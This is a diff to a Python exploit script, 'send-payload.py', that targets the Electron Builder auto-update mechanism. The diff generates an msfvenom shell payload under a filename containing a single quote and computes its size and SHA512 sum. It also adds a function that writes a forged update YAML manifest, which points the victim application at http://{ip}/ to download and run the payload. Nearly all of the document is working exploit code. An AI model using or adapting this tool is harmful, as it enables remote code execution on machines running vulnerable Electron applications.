@@ -28,7 +28,11 @@ def get_payload(args, ip, port, path):
     """generate a payload with msfvenom, calculate its size and sha512 sum
     if a payload has already been generated, just calculate its size and sha512 sum"""
 
+    print("\n=== Generating Payload ===\n")
+
     payload_path = ""
+
+    payload_name = "heedv1'Setup1.0.1.exe"
 
     #get payload options, taking --payload as priority over --msf_payload if both provided
     if args.payload is not None:
@@ -52,14 +56,16 @@ def get_payload(args, ip, port, path):
         #generate shell payload
         gen_payload(ip, port, msf_payload, path)
 
-        payload_path = path + "heedv1'Setup1.0.1.exe"
+        payload_path = path + payload_name
         print("Payload saved at: " + payload_path)
     
     #get size of payload
     size = os.path.getsize(Path(payload_path))
     print("Size: " + str(size))
 
-    gen_checksum(Path(payload_path))
+    sum = gen_checksum(Path(payload_path))
+
+    return payload_name, size, sum
 
 def gen_checksum(filepath):
     """generate a sha512 hash of the file and base64 encode it"""
@@ -76,10 +82,29 @@ def gen_checksum(filepath):
                 break
             sha512.update(data)
 
-    # b64 = base64.b64encode(sha512.encode('utf-8'))
     b64 = base64.b64encode(sha512.digest()).decode('utf-8')
 
-    print(b64)
+    print("Base64-encoded SHA512-sum of payload: " + b64)
+
+    return b64
+
+def gen_yaml(ip, payload, size, sum):
+
+    print("\n=== Generating YAML File ===\n")
+
+    yml_string = ("version: 1.0.1\n"
+        "files:\n"
+        "  url: http://{ip}/{payload}\n"
+        "  sha512: {sha}\n"
+        "  size: {size}\n"
+        "path: {payload}\n"
+        "sha512: {sha}\n"
+        "releaseDate: '2021-04-21T11:17:02.627Z'"
+        ).format(ip=ip, payload=payload, sha=sum, size=size)
+    
+    print(yml_string)
+
+    return yml_string
 
 def main():
     parser = argparse.ArgumentParser(prog="send-payload.py", description="Sends a payload to a vulnerable Electron Builder instance over SMB. If no port is provided, listens on port 9001 by default. No default option for IP address is specified.")
@@ -127,7 +152,9 @@ def main():
             print("Directory not found - creating directory")
             dirpath.mkdir()
     
-    get_payload(args, ip, port, path)
+    payload_name, size, sum = get_payload(args, ip, port, path)
+
+    gen_yaml(ip, payload_name, size, sum)
 
 if __name__ == '__main__':
     main()
